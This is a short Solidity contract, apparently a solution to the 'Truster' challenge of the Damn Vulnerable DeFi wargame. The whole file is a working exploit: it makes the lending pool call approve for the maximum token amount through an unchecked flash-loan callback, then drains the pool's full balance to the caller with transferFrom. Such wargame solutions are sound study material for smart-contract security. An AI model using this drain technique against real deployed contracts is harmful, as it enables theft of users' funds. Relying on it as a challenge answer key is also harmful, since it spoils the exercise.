// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";

contract TrusterAttacker {
    function attack(address payable lenderpool) external {
        // Get the token address
        TrusterLenderPool pool = TrusterLenderPool(lenderpool);
        address token = address(pool.damnValuableToken());
        
        // Allow this contract to initiate transfer of UINT_MAX
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        pool.flashLoan(0, msg.sender, token, data);

        // Transfer all balance to the function caller
        uint256 balance = IERC20(token).balanceOf(lenderpool);
        IERC20(token).transferFrom(lenderpool, msg.sender, balance);
    }
}
